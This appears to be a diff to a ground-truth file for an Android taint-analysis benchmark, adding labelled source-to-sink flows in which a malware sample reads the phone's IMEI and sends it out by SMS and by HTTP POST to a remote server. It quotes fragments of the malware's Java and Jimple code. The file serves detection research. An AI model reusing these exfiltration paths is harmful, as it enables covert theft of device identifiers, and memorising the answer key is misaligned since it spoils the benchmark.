@@ -101,7 +101,8 @@
         "nonStaticField": true
       },
       "ID": 1,
-      "description": "This malicious flow leaks the IMEI via an HTTP POST Request."
+      "description": "This malicious flow leaks the IMEI via an HTTP POST Request.",
+      "isNegative": false
     },
     {
       "source": {
@@ -175,7 +176,8 @@
         "lifecycle": true
       },
       "ID": 2,
-      "description": "This is is an implicit flow. When a certain SMS is received it sends another SMS."
+      "description": "This is is an implicit flow. When a certain SMS is received it sends another SMS.",
+      "isNegative": false
     },
     {
       "source": {
@@ -265,7 +267,164 @@
         "staticField": true
       },
       "ID": 3,
-      "description": "This malicious flow sends device id in a SMS message back to the sender when a certian SMS message is received. "
+      "description": "This malicious flow sends device id in a SMS message back to the sender when a certian SMS message is received. ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "statement": "return telephonyManager.getDeviceId();",
+        "methodName": "public static String getImei(Context context)",
+        "className": "ru.beta.Functions",
+        "lineNo": 549,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "sendTextMessage",
+        "targetNo": 1,
+        "statement": "SmsManager.getDefault().sendTextMessage(number, null, text, null, null);",
+        "methodName": "public static boolean sendSms(String number, String text)",
+        "className": "ru.beta.Functions",
+        "lineNo": 449,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r7.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>($r0, null, $r2, null, null)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "this.imei = Functions.getImei(context);",
+          "methodName": "public boolean load(Context context)",
+          "className": "ru.beta.Settings",
+          "lineNo": 47,
+          "ID": 1
+        },
+        {
+          "statement": "Functions.sendSms(jsonObject.getString(\"phone\"), jsonObject.getString(\"text\"));",
+          "methodName": "public void executeCommands(JSONObject response)",
+          "className": "ru.beta.MainService",
+          "lineNo": 446,
+          "ID": 2
+        },
+        {
+          "statement": "Settings settings = Settings.getSettings();",
+          "methodName": "public static boolean sendSms(String number, String text)",
+          "className": "ru.beta.Functions",
+          "lineNo": 432,
+          "ID": 3
+        },
+        {
+          "statement": "if (settings != null) {",
+          "methodName": "public static boolean sendSms(String number, String text)",
+          "className": "ru.beta.Functions",
+          "lineNo": 433,
+          "ID": 4
+        },
+        {
+          "statement": "text = text.replace(\"{IMEI}\", settings.imei).replace(\"{IMSI}\", settings.imsi).replace(\"{SID}\", settings.sid).replace(\"{VERSION}\", settings.version);",
+          "methodName": "public static boolean sendSms(String number, String text)",
+          "className": "ru.beta.Functions",
+          "lineNo": 438,
+          "ID": 5
+        }
+      ],
+      "description": "This malicious flow sends a SMS contains the device id. ",
+      "isNegative": false,
+      "attributes": {
+        "nonStaticField": true,
+        "pathConstraints": true,
+        "interComponentCommunication": true
+      },
+      "ID": 4
+    },
+    {
+      "source": {
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "statement": "return telephonyManager.getDeviceId();",
+        "methodName": "public static String getImei(Context context)",
+        "className": "ru.beta.Functions",
+        "lineNo": 549,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "getOutputStream",
+        "targetNo": 1,
+        "statement": "DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());",
+        "methodName": "public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList, boolean uploadFile, String data)",
+        "className": "ru.beta.Functions",
+        "lineNo": 102,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = virtualinvoke $r9.<java.net.HttpURLConnection: java.io.OutputStream getOutputStream()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "this.imei = Functions.getImei(context);",
+          "methodName": "public boolean load(Context context)",
+          "className": "ru.beta.Settings",
+          "lineNo": 47,
+          "ID": 1
+        },
+        {
+          "statement": "if (settings.load(context)) {",
+          "methodName": "public Beta(Context context, JSONObject jsonObject)",
+          "className": "ru.beta.Beta",
+          "lineNo": 33,
+          "ID": 2
+        },
+        {
+          "statement": "HttpURLConnection connection = Functions.sendHttpRequest(settings.server, \"POST\", getDefaultHttpParams(\"callback\"), new LinkedList(), false, null);",
+          "methodName": "public static JSONObject sendRequest(Context context)",
+          "className": "ru.beta.Beta",
+          "lineNo": 127,
+          "ID": 3
+        },
+        {
+          "statement": "params.add(new BasicNameValuePair(\"imei\", settings.imei));",
+          "methodName": "public static List<NameValuePair> getDefaultHttpParams(String type)",
+          "className": "ru.beta.Beta",
+          "lineNo": 99,
+          "ID": 4
+        },
+        {
+          "statement": "param = (NameValuePair) paramsList.get(i);",
+          "methodName": "public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList, boolean uploadFile, String data)",
+          "className": "ru.beta.Functions",
+          "lineNo": 96,
+          "ID": 5
+        },
+        {
+          "statement": "connection.setRequestProperty(param.getName(), param.getValue());",
+          "methodName": "public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList, boolean uploadFile, String data)",
+          "className": "ru.beta.Functions",
+          "lineNo": 97,
+          "ID": 6
+        }
+      ],
+      "description": "This malicious flow sends device Id to a remote server.",
+      "isNegative": false,
+      "attributes": {
+        "nonStaticField": true,
+        "interComponentCommunication": true
+      },
+      "ID": 5
     }
   ]
 }
